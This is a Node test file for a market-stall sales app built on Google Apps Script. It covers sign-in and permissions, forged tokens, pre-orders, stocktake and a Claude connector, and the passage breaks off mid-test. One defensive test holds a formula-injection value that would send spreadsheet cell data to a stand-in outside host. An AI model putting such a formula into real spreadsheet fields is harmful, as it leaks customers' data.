/**
 * Runs the real server/*.gs files in Node against an in-memory spreadsheet,
 * with Google's services replaced by small fakes. No network, no Google.
 *
 *   node tests/server.test.js
 *
 * Covers sign-in and permissions, the part where a mistake locks people out
 * or lets the wrong person in.
 */
'use strict';
const fs = require('fs');
const path = require('path');
const vm = require('vm');
const crypto = require('crypto');
const assert = require('assert');

/* ---------- fakes for the Apps Script services ---------- */

function makeSheet() {
  const rows = [];
  const sheet = {
    rows,
    appendRow(r) { rows.push(r.slice()); },
    getLastRow() { return rows.length; },
    getLastColumn() { return rows.reduce((m, r) => Math.max(m, r.length), 0); },
    getRange(r, c, nr, nc) {
      nr = nr || 1; nc = nc || 1;
      return {
        getValues() {
          const out = [];
          for (let i = 0; i < nr; i++) {
            const row = rows[r - 1 + i] || [];
            const o = [];
            for (let j = 0; j < nc; j++) {
              const v = row[c - 1 + j] === undefined ? '' : row[c - 1 + j];
              // Like Sheets: a leading apostrophe only marks text; reading gives the text without it.
              o.push(typeof v === 'string' && v.charAt(0) === "'" ? v.slice(1) : v);
            }
            out.push(o);
          }
          return out;
        },
        getValue() { return this.getValues()[0][0]; },
        setValue(v) { (rows[r - 1] = rows[r - 1] || [])[c - 1] = v; return this; },
        setValues(vs) {
          vs.forEach((row, i) => row.forEach((v, j) => {
            (rows[r - 1 + i] = rows[r - 1 + i] || [])[c - 1 + j] = v;
          }));
          return this;
        },
        setFontWeight() { return this; }, setBackground() { return this; },
        setFontColor() { return this; }
      };
    },
    deleteRow(n) { rows.splice(n - 1, 1); },
    deleteRows(n, k) { rows.splice(n - 1, k); },
    setFrozenRows() {}
  };
  return sheet;
}

function load(googleTokens) {
  const sheets = {};
  const props = {};
  const ctx = {
    console, __gh: [],
    __created: [],
    SpreadsheetApp: {
      getActiveSpreadsheet: () => ({
        getName: () => 'Test sheet',
        getSheetByName: (n) => sheets[n] || null,
        insertSheet: (n) => (sheets[n] = Object.assign(makeSheet(), { getName: () => n })),
        getSheets: () => Object.keys(sheets).map((n) => sheets[n])
      }),
      // A new spreadsheet (the backup): kept on ctx.__created to look at.
      create: (name) => {
        const tabs = { Sheet1: Object.assign(makeSheet(), { getName: () => 'Sheet1' }) };
        const ss = { name, tabs, getUrl: () => 'https://docs.google.com/spreadsheets/d/backup' + ctx.__created.length,
          getSheets: () => Object.keys(tabs).map((n) => tabs[n]),
          insertSheet: (n) => (tabs[n] = Object.assign(makeSheet(), { getName: () => n })),
          deleteSheet: (t) => { delete tabs[t.getName()]; } };
        ctx.__created.push(ss);
        return ss;
      },
      getUi: () => ({ alert() {} 
      })
    },
    PropertiesService: {
      getScriptProperties: () => ({
        getProperty: (k) => (k in props ? props[k] : null),
        setProperty: (k, v) => { props[k] = v; }
      })
    },
    Utilities: {
      getUuid: () => crypto.randomUUID(),
      computeHmacSha256Signature: (v, key) =>
        Array.from(crypto.createHmac('sha256', key).update(v).digest()).map((b) => (b > 127 ? b - 256 : b)),
      formatDate: (d, tz, f) => {
        // Like Apps Script in South Africa (UTC+2), for the patterns the server uses.
        const z = new Date(new Date(d).getTime() + 2 * 3600e3), p = (n) => String(n).padStart(2, '0');
        const M = ['Jan', 'Feb', 'Mar', 'Apr', 'May', 'Jun', 'Jul', 'Aug', 'Sep', 'Oct', 'Nov', 'Dec'];
        const parts = { yyyy: z.getUTCFullYear(), MMM: M[z.getUTCMonth()], MM: p(z.getUTCMonth() + 1),
          dd: p(z.getUTCDate()), d: z.getUTCDate(), HH: p(z.getUTCHours()), mm: p(z.getUTCMinutes()) };
        return f.replace(/yyyy|MMM|MM|dd|d|HH|mm/g, (k) => parts[k]);
      }
    },
    LockService: { getScriptLock: () => ({ waitLock() { if (ctx.__busy) throw new Error('could not get the lock'); }, releaseLock() {} }) },
    UrlFetchApp: {
      fetch: (url, opts) => {
        if (url.indexOf('api.github.com') !== -1 && opts && opts.method === 'get') {
          const good = /good/.test(opts.headers.Authorization);
          return { getResponseCode: () => (good ? 200 : 401), getContentText: () => '{}' };
        }
        if (url.indexOf('api.github.com') !== -1) {
          ctx.__gh.push({ url, opts });
          return { getResponseCode: () => 201,
                   getContentText: () => JSON.stringify({ html_url: 'https://github.com/o/r/issues/7' }) };
        }
        const tok = decodeURIComponent(url.split('id_token=')[1]);
        const info = googleTokens[tok];
        return {
          getResponseCode: () => (info ? 200 : 400),
          getContentText: () => JSON.stringify(info || { error: 'invalid_token' })
        };
      }
    },
    ScriptApp: { getService: () => ({ getUrl: () => 'https://example/exec' }) },
    ContentService: {}, HtmlService: {}
  };
  vm.createContext(ctx);
  // Start every test from "Google off", whatever Platform.gs currently holds.
  const dir = path.join(__dirname, '..', 'server');
  fs.readdirSync(dir).filter((f) => f.endsWith('.gs')).sort().forEach((f) => {
    vm.runInContext(fs.readFileSync(path.join(dir, f), 'utf8'), ctx, { filename: f });
  });
  ctx.SF.PLATFORM.googleClientId = '';
  ctx.SF.PLATFORM.admins = [];
  ctx.SF.migrate();
  return { SF: ctx.SF, sheets, props, gh: ctx.__gh, ctx, created: ctx.__created };
}

const CLIENT = 'client-123.apps.googleusercontent.com';
const future = String(Math.floor(Date.now() / 1000) + 3600);
function idToken(email, extra) {
  return Object.assign({ aud: CLIENT, iss: 'https://accounts.google.com',
                         email, email_verified: 'true', exp: future, name: 'Test' }, extra || {});
}
const TOKENS = {
  admin: idToken('Boss@StallFlow.co.za'),
  helper: idToken('helper@gmail.com'),
  stranger: idToken('stranger@gmail.com'),
  wrongAud: idToken('helper@gmail.com', { aud: 'someone-else' }),
  unverified: idToken('helper@gmail.com', { email_verified: 'false' })
};

let failures = 0;
function test(name, fn) {
  try { fn(); console.log('ok   ' + name); }
  catch (e) { failures++; console.log('FAIL ' + name + '\n     ' + e.message); }
}
const signIn = (SF, credential) => SF.dispatch('signInGoogle', { credential, device: 'd1' }).data;

/* ---------- PIN mode, before Google is switched on ---------- */

test('without a client ID, PIN sign-in still works', () => {
  const { SF } = load(TOKENS);
  assert.strictEqual(SF.googleOn(), false);
  SF.setPin('owner', '4321');
  const r = SF.dispatch('signIn', { pin: '4321', device: 'd1' }).data;
  assert.strictEqual(r.ok, true);
  assert.strictEqual(r.role, 'owner');
  assert.strictEqual(SF.dispatch('health', { token: r.token }).ok, true);
});

test('without a client ID, Google sign-in is refused', () => {
  const { SF } = load(TOKENS);
  assert.strictEqual(signIn(SF, 'admin').ok, false);
});

test('a client ID with no admins leaves PINs on, so nobody is locked out', () => {
  const { SF } = load(TOKENS);
  SF.PLATFORM.googleClientId = CLIENT;
  SF.PLATFORM.admins = [];
  assert.strictEqual(SF.googleOn(), false);
  SF.setPin('owner', '4321');
  assert.strictEqual(SF.dispatch('signIn', { pin: '4321', device: 'd1' }).data.ok, true);
});

/* ---------- Google mode ---------- */

function google() {
  const env = load(TOKENS);
  env.SF.PLATFORM.googleClientId = CLIENT;
  env.SF.PLATFORM.admins = ['boss@stallflow.co.za'];
  return env;
}

test('a platform admin signs in as owner, whatever the case of the email', () => {
  const { SF } = google();
  const r = signIn(SF, 'admin');
  assert.strictEqual(r.ok, true);
  assert.strictEqual(r.role, 'owner');
  assert.strictEqual(r.user, 'boss@stallflow.co.za');
});

test('someone not on the list is turned away with a clear message', () => {
  const { SF } = google();
  const r = signIn(SF, 'stranger');
  assert.strictEqual(r.ok, false);
  assert.ok(/not been added/.test(r.message));
});

test('a token for another app, or an unverified email, is refused', () => {
  const { SF } = google();
  SF.append('users', { Email: 'helper@gmail.com', Role: 'cashier', Active: 'Yes' });
  assert.strictEqual(signIn(SF, 'wrongAud').ok, false);
  assert.strictEqual(signIn(SF, 'unverified').ok, false);
  assert.strictEqual(signIn(SF, 'nonsense').ok, false);
});

test('PINs stop working once Google is on', () => {
  const { SF } = load(TOKENS);
  SF.setPin('owner', '4321');
  const pinToken = SF.dispatch('signIn', { pin: '4321', device: 'd1' }).data.token;
  SF.PLATFORM.googleClientId = CLIENT;
  SF.PLATFORM.admins = ['boss@stallflow.co.za'];
  assert.strictEqual(SF.dispatch('signIn', { pin: '4321', device: 'd1' }).data.ok, false);
  assert.strictEqual(SF.dispatch('signIn', { pin: '', device: 'd1' }).data.ok, false,
    'a blank PIN must not give owner access any more');
  assert.strictEqual(SF.dispatch('health', { token: pinToken }).code, 'auth');
});

test('the owner adds a cashier, who can sell but not see People', () => {
  const { SF } = google();
  const owner = signIn(SF, 'admin').token;
  const add = SF.dispatch('savePerson', { token: owner, opId: 'a1', email: 'Helper@Gmail.com',
                                           role: 'cashier' });
  assert.strictEqual(add.ok, true);
  const helper = signIn(SF, 'helper');
  assert.strictEqual(helper.ok, true);
  assert.strictEqual(helper.role, 'cashier');
  assert.strictEqual(SF.dispatch('till', { token: helper.token }).ok, true);
  assert.strictEqual(SF.dispatch('people', { token: helper.token }).code, 'forbidden');
});

test('promoting someone works on their next tap, without signing in again', () => {
  const { SF } = google();
  const owner = signIn(SF, 'admin').token;
  SF.dispatch('savePerson', { token: owner, opId: 'a1', email: 'helper@gmail.com', role: 'cashier' });
  const helper = signIn(SF, 'helper').token;
  assert.strictEqual(SF.dispatch('people', { token: helper }).code, 'forbidden');
  SF.dispatch('savePerson', { token: owner, opId: 'a2', email: 'helper@gmail.com', role: 'owner' });
  assert.strictEqual(SF.dispatch('people', { token: helper }).ok, true);
});

test('switching someone off locks them out straight away', () => {
  const { SF } = google();
  const owner = signIn(SF, 'admin').token;
  SF.dispatch('savePerson', { token: owner, opId: 'a1', email: 'helper@gmail.com', role: 'manager' });
  const helper = signIn(SF, 'helper').token;
  SF.dispatch('savePerson', { token: owner, opId: 'a2', email: 'helper@gmail.com', role: 'manager',
                              active: false });
  assert.strictEqual(SF.dispatch('till', { token: helper }).code, 'auth');
  assert.strictEqual(signIn(SF, 'helper').ok, false);
});

test('a platform admin cannot be demoted, and nobody can change their own access', () => {
  const { SF } = google();
  const owner = signIn(SF, 'admin').token;
  assert.strictEqual(SF.dispatch('savePerson', { token: owner, opId: 'a1',
    email: 'boss@stallflow.co.za', role: 'viewer' }).ok, false);
  SF.dispatch('savePerson', { token: owner, opId: 'a2', email: 'helper@gmail.com', role: 'owner' });
  const helper = signIn(SF, 'helper').token;
  assert.strictEqual(SF.dispatch('savePerson', { token: helper, opId: 'a3',
    email: 'helper@gmail.com', role: 'viewer' }).ok, false);
});

test('a forged or edited token is refused', () => {
  const { SF } = google();
  const t = signIn(SF, 'admin').token.split('|');
  t[3] = 'helper@gmail.com';
  assert.strictEqual(SF.dispatch('health', { token: t.join('|') }).code, 'auth');
});

test('the audit trail names the person, not just the role', () => {
  const { SF, sheets } = google();
  const owner = signIn(SF, 'admin').token;
  SF.dispatch('savePerson', { token: owner, opId: 'a1', email: 'helper@gmail.com', role: 'cashier' });
  const actors = sheets.Audit.rows.slice(1).map((r) => r[1]);
  assert.ok(actors.indexOf('boss@stallflow.co.za') !== -1, actors.join(', '));
});

test('boot tells the app who is signed in and that Google is on', () => {
  const { SF } = google();
  const owner = signIn(SF, 'admin').token;
  const b = SF.dispatch('boot', { token: owner }).data;
  assert.strictEqual(b.me.user, 'boss@stallflow.co.za');
  assert.strictEqual(b.auth.google, true);
});

/* ---------- orders from the public page ---------- */

function shop(marketDate) {
  const env = load(TOKENS);
  const SF = env.SF;
  SF.append('products', { ProductId: 'P01', Name: 'Apricot Jam', Type: 'stocked', Unit: 'each',
                          Price: 70, Active: 'Yes', Sort: 10 });
  SF.move('P01', 10, 'adjust', 'test');
  SF.append('markets', { MarketId: 'M01', Name: 'Test Market', Date: marketDate, Status: 'planned' });
  SF.set('activeMarket', 'M01');
  return env;
}
const day = (n) => new Date(Date.now() + n * 864e5).toISOString().slice(0, 10);
let op = 0;
const order = (SF, extra) => SF.dispatch('placeOrder', Object.assign({
  opId: 'o' + (op++), name: 'Anna', phone: '082 123 4567', consent: true,
  lines: [{ id: 'P01', qty: 1 }] }, extra || {}));

test('a formula typed as a name is stored as plain text', () => {
  const { SF, sheets } = shop(day(3));
  assert.strictEqual(order(SF, { name: '=IMAGE("https://x.example/?"&D2)', note: '+1 more' }).ok, true);
  const row = sheets.Orders.rows[1];
  assert.ok(String(row[4]).startsWith("'="), 'name: ' + row[4]);
  assert.ok(String(row[13]).startsWith("'+"), 'note: ' + row[13]);
});

test('one phone number can hold at most 2 unpaid orders per market', () => {
  const { SF } = shop(day(3));
  assert.strictEqual(order(SF).ok, true);
  assert.strictEqual(order(SF, { phone: '0821234567' }).ok, true);
  const third = order(SF, { phone: '+27 82 123 4567'.replace('+27 ', '0') });
  assert.strictEqual(third.ok, false);
  assert.ok(/already has 2/.test(third.message));
  assert.strictEqual(order(SF, { phone: '083 999 0000' }).ok, true, 'someone else can still order');
});

test('pre-orders close by themselves once the market date has passed', () => {
  const { SF } = shop(day(-1));
  assert.strictEqual(SF.preordersOpen(), false);
  assert.strictEqual(order(SF).ok, false);
  assert.strictEqual(SF.dispatch('catalogue', {}).data.open, false);
});

test('pre-orders stay open on the day of the market', () => {
  const { SF } = shop(day(0));
  assert.strictEqual(order(SF).ok, true);
});

test('releasing unpaid reservations puts the stock back', () => {
  const { SF } = shop(day(3));
  order(SF); order(SF, { phone: '083 999 0000' });
  assert.strictEqual(SF.onHand().P01, 8);
  SF.setPin('owner', '4321');
  const t = SF.dispatch('signIn', { pin: '4321', device: 'd' }).data.token;
  const r = SF.dispatch('releaseUnpaid', { token: t, opId: 'r1' });
  assert.strictEqual(r.released, 2);
  assert.strictEqual(SF.onHand().P01, 10);
});

test('customer details are wiped once their market is over, and only then', () => {
  const { SF, sheets } = shop(day(3));
  order(SF, { note: 'gate 2' });
  SF.purgeCustomers();
  assert.strictEqual(String(sheets.Orders.rows[1][4]), 'Anna', 'live market keeps its customers');
  SF.append('markets', { MarketId: 'M02', Name: 'Next', Date: day(10), Status: 'planned' });
  SF.set('activeMarket', 'M02');
  assert.strictEqual(SF.purgeCustomers(), 0, 'a future market is not over yet');
  SF.setCell('markets', 2, 'Date', day(-1));
  assert.strictEqual(SF.purgeCustomers(), 1);
  const row = sheets.Orders.rows[1];
  assert.deepStrictEqual([row[4], row[5], row[13]], ['Customer', '', '']);
  assert.strictEqual(row[8], 70, 'the money stays');
});

test('the Duxies stocktake loads prices and counts, and running it twice changes nothing', () => {
  const { SF } = shop(day(3));
  const ctx = vm.createContext(Object.assign({}, { SF, SpreadsheetApp: {} }));
  // Stocktake.gs only needs SF, so run it in a small context that shares it.
  ['Costing.gs', 'Stocktake.gs'].forEach((f) => vm.runInContext(
    fs.readFileSync(path.join(__dirname, '..', 'stalls', 'duxies', f), 'utf8'), ctx));
  SF.pots = () => ctx.sfPots();
  SF.newPot = (n) => ctx.sfNewPot(n);   // in Apps Script every file shares one global scope
  const first = ctx.sfApplyStocktake();
  assert.strictEqual(first.off, 1, 'the old placeholder jam is switched off');
  assert.strictEqual(SF.onHand().P01, 0, 'and its jars no longer count');
  const ps = SF.products();
  const find = (n, v) => ps.find((p) => p.name === n && p.variant === v);
  assert.strictEqual(find('Strawberry', '125 ml').onHand, 17);
  assert.strictEqual(find('Strawberry', '352 ml').price, 70);
  assert.strictEqual(find('Fig', '125 ml').price, 50);
  assert.strictEqual(find('Orange Marmalade Whiskey', 'Medium (odd bottle)').price, 60);
  assert.strictEqual(find('Butter Biscuits', '300 g pack').type, 'made');
  assert.strictEqual(first.jars, 225);
  const big = find('Strawberry', '352 ml').cost, small = find('Strawberry', '125 ml').cost;
  assert.ok(big > 30 && big < 40, 'a big strawberry jar costs about R34, got ' + big);
  assert.ok(small > 7.8 && small < big, 'a small jar costs its bottle and less fruit');
  assert.ok(find('Butter Biscuits', '300 g pack').cost > 20);
  assert.strictEqual(find('Crunchies', '300 g pack').cost, 0, 'no recipe, no guess');
  assert.strictEqual(find('Strawberry', '352 ml').onHand, 14, 'a bottle cost adds no stock');
  const again = ctx.sfApplyStocktake();
  assert.deepStrictEqual([again.added, again.moved], [0, 0]);
  assert.strictEqual(find('Strawberry', '352 ml').cost, SF.products().find((p) => p.name === 'Strawberry' && p.variant === '352 ml').cost);
  assert.strictEqual(SF.rows('batches').length, again.costed, 'running it again updates, never duplicates');

  // Cooking a pot: pre-filled recipe, jars on the shelf, cupboard goes down.
  SF.setPin('owner', '4321');
  const tok = SF.dispatch('signIn', { pin: '4321', device: 'd' }).data.token;
  SF.dispatch('savePantry', { token: tok, opId: 'c1', item: 'Strawberries', qty: 5, unit: 'kg' });
  SF.dispatch('savePantry', { token: tok, opId: 'c2', item: 'Sugar', qty: 2000, unit: 'g' });
  SF.dispatch('savePantry', { token: tok, opId: 'c3', item: '352 ml bottles', qty: 10, unit: 'each' });
  const st = SF.dispatch('stock', { token: tok }).data;
  const pot = st.pots.find((x) => x.name === 'Strawberry');
  assert.strictEqual(st.pantry.some((r) => r.item === 'Odd bottles'), true, 'the cupboard lists what pots use');
  const bigId = pot.sizes.find((x) => x.variant === '352 ml').productId;
  const smallId = pot.sizes.find((x) => x.variant === '125 ml').productId;
  const before = SF.onHand()[bigId];
  const res = SF.dispatch('cookPot', { token: tok, opId: 'c4', name: 'Strawberry', lines: pot.lines,
                                       jars: { [bigId]: 5, [smallId]: 3 } });
  assert.strictEqual(res.ok, true, res.message);
  assert.strictEqual(SF.onHand()[bigId], before + 5);
  const left = Object.fromEntries(SF.pantry().map((r) => [r.item, r.qty]));
  assert.deepStrictEqual([left.Strawberries, left.Sugar, left['352 ml bottles']], [2, 0, 5]);
  // Changing the usual recipe, and starting a new jam.
  const lines2 = pot.lines.concat([{ label: 'Lemon juice', qty: 1, unit: 'pot', price: 5 }]);
  assert.strictEqual(SF.dispatch('saveRecipe', { token: tok, opId: 'r1', name: 'Strawberry',
                                                 makes: 6, lines: lines2 }).ok, true);
  const pot2 = SF.dispatch('stock', { token: tok }).data.pots.find((x) => x.name === 'Strawberry');
  assert.ok(pot2.lines.some((l) => l.label === 'Lemon juice'), 'the saved recipe is used');
  const nu = SF.dispatch('saveRecipe', { token: tok, opId: 'r2', name: 'Quince', makes: 6,
                                         lines: [{ label: 'Quinces', qty: 3, unit: 'kg', price: 20 }] });
  assert.strictEqual(nu.isNew, true);
  const q = SF.dispatch('stock', { token: tok }).data.pots.find((x) => x.name === 'Quince');
  assert.strictEqual(q.sizes.length, 3, 'a new jam gets all three sizes on the shelf list');
  assert.strictEqual(JSON.stringify(q.sizes.map((x) => x.variant)), JSON.stringify(['352 ml', 'Medium (odd bottle)', '125 ml']));
  assert.strictEqual(SF.dispatch('cookPot', { token: tok, opId: 'c5', name: 'Strawberry',
                                              lines: pot.lines, jars: {} }).ok, false);
});

test('a sale between markets is kept apart from the live market', () => {
  const { SF } = shop(day(3));
  SF.setPin('owner', '4321');
  const tok = SF.dispatch('signIn', { pin: '4321', device: 'd' }).data.token;
  SF.dispatch('sell', { token: tok, opId: 's1', lines: [{ id: 'P01', qty: 1 }] });
  SF.dispatch('sell', { token: tok, opId: 's2', where: 'home', lines: [{ id: 'P01', qty: 2 }] });
  const at = SF.dispatch('dashboard', { token: tok, marketId: 'M01' }).data;
  const home = SF.dispatch('dashboard', { token: tok, marketId: 'HOME' }).data;
  assert.ok(at.markets.some((m) => m.id === 'HOME'), 'Numbers can pick it');
  assert.strictEqual(SF.onHand().P01, 7, 'both sales come off the shelf');
  const total = (d) => JSON.stringify(d).match(/"revenue":(\d+)/)[1];
  assert.strictEqual(total(at), '70');
  assert.strictEqual(total(home), '140');
});

test('two markets on the same day keep their own sales', () => {
  const { SF } = shop(day(3));
  SF.append('markets', { MarketId: 'M02', Name: 'RNW', Date: day(3), Status: 'planned' });
  SF.setPin('owner', '4321');
  const tok = SF.dispatch('signIn', { pin: '4321', device: 'd' }).data.token;
  SF.dispatch('sell', { token: tok, opId: 'a', marketId: 'M01', lines: [{ id: 'P01', qty: 1 }] });
  SF.dispatch('sell', { token: tok, opId: 'b', marketId: 'M02', lines: [{ id: 'P01', qty: 2 }] });
  SF.dispatch('sell', { token: tok, opId: 'c', marketId: 'nonsense', lines: [{ id: 'P01', qty: 1 }] });
  const t1 = SF.dispatch('till', { token: tok, marketId: 'M01' }).data;
  const t2 = SF.dispatch('till', { token: tok, marketId: 'M02' }).data;
  assert.strictEqual(t1.totals.tillTotal, 140, 'an unknown market falls back to the live one');
  assert.strictEqual(t2.totals.tillTotal, 140);
  assert.ok(t1.markets.some((m) => m.id === 'M02') && t1.markets.some((m) => m.id === 'HOME'));
});

test('markets running at the same time stay apart: sales, pre-orders and numbers', () => {
  const { SF } = shop(day(0));
  SF.append('markets', { MarketId: 'M02', Name: 'RNW', Date: day(0), Status: 'planned' });
  SF.set('preorders', 'yes');
  SF.setPin('owner', '4321');
  const tok = SF.dispatch('signIn', { pin: '4321', device: 'd' }).data.token;
  const o1 = SF.dispatch('placeOrder', { opId: 'o1', name: 'Anna', phone: '082 000 0001', consent: true,
    lines: [{ id: 'P01', qty: 1 }], market: 'M01' });
  const o2 = SF.dispatch('placeOrder', { opId: 'o2', name: 'Bea', phone: '082 000 0002', consent: true,
    lines: [{ id: 'P01', qty: 1 }], market: 'M02' });
  assert.ok(o1.ok && o2.ok, JSON.stringify([o1, o2]));
  SF.dispatch('sell', { token: tok, opId: 's1', marketId: 'M01', lines: [{ id: 'P01', qty: 1 }] });
  SF.dispatch('sell', { token: tok, opId: 's2', marketId: 'M02', lines: [{ id: 'P01', qty: 3 }] });
  SF.dispatch('sell', { token: tok, opId: 's3', marketId: 'home', lines: [{ id: 'P01', qty: 1 }] });
  const t1 = SF.dispatch('till', { token: tok, marketId: 'M01' }).data;
  const t2 = SF.dispatch('till', { token: tok, marketId: 'M02' }).data;
  const th = SF.dispatch('till', { token: tok, marketId: 'home' }).data;
  assert.strictEqual(t1.totals.tillCount, 1); assert.strictEqual(t2.totals.tillCount, 1);
  assert.strictEqual(t2.totals.tillTotal, 3 * t1.totals.tillTotal, 'each market has only its own sales');
  assert.strictEqual(th.totals.tillCount, 1);
  assert.strictEqual(t1.unpaid.map((o) => o.customer).join(), 'Anna');
  assert.strictEqual(t2.unpaid.map((o) => o.customer).join(), 'Bea');
  assert.strictEqual(th.unpaid.length, 0);
  assert.strictEqual(t1.running.map((m) => m.id + ':' + m.count).sort().join(), 'M01:1,M02:1', 'every market on today\'s date is listed with its own count');
  const n1 = SF.dispatch('dashboard', { token: tok, marketId: 'M01' }).data;
  const n2 = SF.dispatch('dashboard', { token: tok, marketId: 'M02' }).data;
  assert.strictEqual(n2.summary.revenue, 3 * n1.summary.revenue, 'Numbers are per market too');
});

test('a stall data fix runs once, only changes what is still as it was, and never breaks the app', () => {
  const env = shop(day(3));
  const { SF, ctx } = env;
  SF.append('markets', { MarketId: 'M03', Name: 'Blairegowrie Church Market', Date: day(0), Location: 'Christ Church Blairgowrie, Gordon Avenue', Status: 'planned' });
  vm.runInContext(fs.readFileSync(path.join(__dirname, '..', 'stalls', 'duxies', 'Fixes.gs'), 'utf8'), ctx);
  const row = () => SF.rows('markets').filter((m) => m.MarketId === 'M03')[0];
  assert.strictEqual(SF.runDataFixes().length, 2, 'both one-off fixes ran');
  assert.strictEqual(row().Name, 'Blairegowrie Craft Market');
  assert.ok(/Domus Dei Campus, 39 Malcolm Road/.test(row().Location), row().Location);
  // typed in by hand afterwards: the fix is spent and never overwrites it
  SF.setCell('markets', row()._row, 'Name', 'Blairgowrie Craft Market');
  assert.strictEqual(SF.runDataFixes().length, 0);
  assert.strictEqual(row().Name, 'Blairgowrie Craft Market');
  // the lizard ornament: added once with 1 in stock, and not again
  const liz = () => SF.products({ all: true }).filter((x) => /lizard/i.test(x.name));
  assert.strictEqual(liz().length, 1); assert.strictEqual(liz()[0].onHand, 1);
  assert.strictEqual(liz()[0].price, 105); assert.strictEqual(liz()[0].category, 'Resin');
  // a fix that throws does not escape
  vm.runInContext("sfDataFixes = function () { return [{ id: 'boom', what: 'x', run: function () { throw new Error('no'); } }]; };", ctx);
  assert.deepStrictEqual(Array.from(SF.runDataFixes()), []);
});

test('a new product can start with the stock she has on the shelf', () => {
  const { SF } = shop(day(3));
  SF.setPin('owner', '4321');
  const tok = SF.dispatch('signIn', { pin: '4321', device: 'd' }).data.token;
  const r = SF.dispatch('saveProduct', { token: tok, opId: 'np1', name: 'Lizard resin ornament', category: 'Resin', type: 'stocked', unit: 'each', price: 105, qty: 4 });
  assert.ok(r.ok, JSON.stringify(r));
  let p = SF.dispatch('stock', { token: tok }).data.products.filter((x) => x.name === 'Lizard resin ornament')[0];
  assert.strictEqual(p.onHand, 4); assert.strictEqual(p.price, 105);
  const r2 = SF.dispatch('saveProduct', { token: tok, opId: 'np2', name: 'Pot of cakes', category: 'Baking', type: 'made', unit: 'each', price: 20, qty: 9, capacity: 10 });
  assert.ok(r2.ok);
  p = SF.dispatch('stock', { token: tok }).data.products.filter((x) => x.name === 'Pot of cakes')[0];
  assert.ok(!p.onHand, 'made-to-order items have no stock count');
  const again = SF.dispatch('saveProduct', { token: tok, opId: 'np1', name: 'Lizard resin ornament', category: 'Resin', type: 'stocked', unit: 'each', price: 105, qty: 4 });
  p = SF.dispatch('stock', { token: tok }).data.products.filter((x) => x.name === 'Lizard resin ornament');
  assert.strictEqual(p.length, 1); assert.strictEqual(p[0].onHand, 4, 'the same request sent twice adds once');
});

/* ---------- Claude as a connector ---------- */
function claudeKit() {
  const env = shop(day(3));
  const { SF } = env;
  SF.setPin('owner', '4321'); SF.setPin('manager', '5555');
  env.owner = SF.dispatch('signIn', { pin: '4321', device: 'd' }).data.token;
  env.manager = SF.dispatch('signIn', { pin: '5555', device: 'd' }).data.token;
  env.key = SF.dispatch('assistantKey', { token: env.owner, opId: 'k' + Math.random() }).key;
  env.rpc = (method, params, key, id) => {
    const r = SF.mcp(key === undefined ? env.key : key, { jsonrpc: '2.0', id: id === undefined ? 1 : id, method, params });
    return r;
  };
  env.call = (name, args) => {
    const r = env.rpc('tools/call', { name, arguments: args }).reply;
    return { isError: r.result.isError, data: JSON.parse(r.result.content[0].text) };
  };
  return env;
}

test('only the owner can make or end the connector key, and only its hash is kept', () => {
  const { SF, owner, manager, props, key } = claudeKit();
  assert.ok(key && key.length >= 32);
  assert.strictEqual(SF.dispatch('assistantKey', { token: manager, opId: 'm1' }).code, 'forbidden');
  assert.strictEqual(SF.dispatch('assistantOff', { token: manager, opId: 'm2' }).code, 'forbidden');
  assert.strictEqual(SF.dispatch('assistantStatus', { token: owner }).data.on, true);
  assert.ok(!JSON.stringify(props).includes(key) && !JSON.stringify(SF.rows('settings')).includes(key), 'the key itself is not stored');
});

test('the connector: wrong key, then the protocol, then a fixed list of tools', () => {
  const env = claudeKit();
  assert.strictEqual(env.rpc('tools/list', {}, 'nope').error.code, -32001);
  const init = env.rpc('initialize', { protocolVersion: '2025-06-18' }).reply.result;
  assert.strictEqual(init.protocolVersion, '2025-06-18'); assert.ok(init.capabilities.tools);
  const tools = env.rpc('tools/list', {}).reply.result.tools.map((t) => t.name).sort();
  assert.strictEqual(tools.join(), 'stallflow_add_product,stallflow_adjust_stock,stallflow_problems,stallflow_set_price,stallflow_stock,stallflow_switch_product');
  assert.strictEqual(env.SF.mcp(env.key, { jsonrpc: '2.0', method: 'notifications/initialized' }).reply, null, 'a notification gets no answer');
  assert.strictEqual(env.call('sell', { lines: [] }).data.ok, false, 'no tool outside the list');
  assert.strictEqual(env.call('setPin', { role: 'owner', pin: '1' }).data.ok, false);
});

test('the connector adds, prices, restocks and switches off, and records each as Claude', () => {
  const env = claudeKit(), { SF } = env;
  const added = env.call('stallflow_add_product', { name: 'Lizard resin ornament', category: 'Resin', price: 105, qty: 4, request_id: 'r1' });
  assert.ok(added.data.ok, JSON.stringify(added));
  env.call('stallflow_add_product', { name: 'Lizard resin ornament', category: 'Resin', price: 105, qty: 4, request_id: 'r1' });
  const find = () => env.call('stallflow_stock', {}).data.products.filter((p) => p.name === 'Lizard resin ornament');
  assert.strictEqual(find().length, 1, 'the same request id changes things once');
  assert.strictEqual(find()[0].onHand, 4); assert.strictEqual(find()[0].price, 105);
  const id = find()[0].id;
  assert.ok(env.call('stallflow_adjust_stock', { product_id: id, qty: -1, reason: 'damaged' }).data.ok);
  assert.ok(env.call('stallflow_adjust_stock', { product_id: id, qty: 10, reason: 'delivery' }).data.ok);
  assert.strictEqual(find()[0].onHand, 13);
  assert.strictEqual(env.call('stallflow_adjust_stock', { product_id: id, qty: 501 }).data.ok, false, 'a huge change is left to the owner');
  assert.strictEqual(env.call('stallflow_adjust_stock', { product_id: 'P99', qty: 1 }).data.ok, false);
  assert.ok(env.call('stallflow_set_price', { product_id: id, price: 110 }).data.ok);
  assert.strictEqual(find()[0].price, 110);
  assert.ok(env.call('stallflow_switch_product', { product_id: id, on: false }).data.ok);
  assert.strictEqual(find()[0].active, false, 'switched off, still there');
  assert.ok(env.call('stallflow_switch_product', { product_id: id, on: true }).data.ok);
  const mine = SF.rows('audit').filter((r) => r.Actor === 'Claude (connector)').map((r) => r.Action);
  assert.ok(['stallflow_add_product', 'stallflow_adjust_stock', 'stallflow_set_price', 'stallflow_switch_product'].every((a) => mine.indexOf(a) !== -1), mine.join());
  assert.strictEqual(env.call('stallflow_add_product', { name: 'x', price: 0 }).data.ok, false);
  assert.ok(env.call('stallflow_problems', {}).data.ok, 'support read works');
});

test('a new key replaces the old one, switching off ends it, and the hourly limit holds', () => {
  const env = claudeKit(), { SF } = env;
  const old = env.key;
  const fresh = SF.dispatch('assistantKey', { token: env.owner, opId: 'k2' }).key;
  assert.strictEqual(SF.mcp(old, { jsonrpc: '2.0', id: 1, method: 'tools/list' }).error.code, -32001);
  assert.ok(SF.mcp(fresh, { jsonrpc: '2.0', id: 1, method: 'tools/list' }).reply.result);
